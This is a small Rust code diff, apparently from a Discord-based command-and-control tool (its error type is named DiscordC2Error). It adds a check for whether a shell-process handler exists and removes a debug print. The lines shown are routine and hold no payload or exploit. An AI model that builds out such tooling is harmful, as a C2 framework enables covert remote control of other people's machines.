@@ -154,6 +154,13 @@ pub struct ProcessHandler {
 
 //TODO: massive cleanup needs to be done here
 impl ProcessHandler {
+    
+    /// Returns true if the PROCESS_HANDLER static is instantiated (is some). False if otherwise.
+    pub async fn is_instantiated() -> bool {
+        let process_handler = PROCESS_HANDLER.lock().await;
+        process_handler.is_some()
+    }
+
     /// Creates a new instance of `ProcessHandler` with the specified `shell_type`.
     /// Returns the created instance wrapped in a `Result` if successful, or an error of type `DiscordC2Error` if there was a problem.
     async fn new(shell_type: ShellType) -> Result<Self, DiscordC2Error> {
@@ -277,7 +284,6 @@ impl ProcessHandler {
 
         let mut process_handler = PROCESS_HANDLER.lock().await;
         *process_handler = None;
-        println!("{:?}", process_handler);
 
         Ok(())
     }
